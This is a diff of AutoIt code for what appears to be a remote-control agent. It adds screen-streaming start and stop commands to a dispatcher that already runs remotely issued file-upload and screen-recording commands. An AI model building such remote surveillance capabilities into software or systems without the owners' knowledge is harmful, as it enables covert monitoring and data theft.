@@ -2,7 +2,7 @@
  Func fetchCommands()
 	 
 	 Local $commandString=getCommands()
-	  
+	;MsgBox(64,"",$commandString)
 	 if StringInStr($commandString,"SUCCESS") Then
 		
 		 Local $commandArray=StringSplit($commandString, "*")
@@ -53,8 +53,19 @@
 		 commandSCREENRECORD($commandUnitArray,$commandArray,$commandId)
 	 
     EndIf
- 
- 
+
+	if StringInStr($command,"STARTSTREAMSERVER")  then 
+		 
+		 commandSTARTSTREAMSERVER($commandUnitArray,$commandArray,$commandId)
+	 
+    EndIf
+	
+	if StringInStr($command,"STOPSTREAMSERVER")  then 
+		 
+		 commandSTOPSTREAMSERVER($commandUnitArray,$commandArray,$commandId)
+	 
+    EndIf
+	
 EndFunc
 
 Func  commandUPLOADFILE($commandUnitArray,$commandArray,$commandId) 
@@ -183,5 +194,19 @@ Func   commandSCREENRECORD($commandUnitArray,$commandArray,$commandId)
 		putCommandFeedBack($commandId, $result)
 		
 	EndIf
+	
+EndFunc
+
+Func   commandSTARTSTREAMSERVER($commandUnitArray,$commandArray,$commandId) 
+	
+	;msgbox(64,"","start streaming server")
+	
+	 startStreamingServer($commandId)
+	
+EndFunc
+
+Func   commandSTOPSTREAMSERVER($commandUnitArray,$commandArray,$commandId) 
+	
+	stopStreamingServer($commandUnitArray,$commandArray,$commandId)
 	
 EndFunc
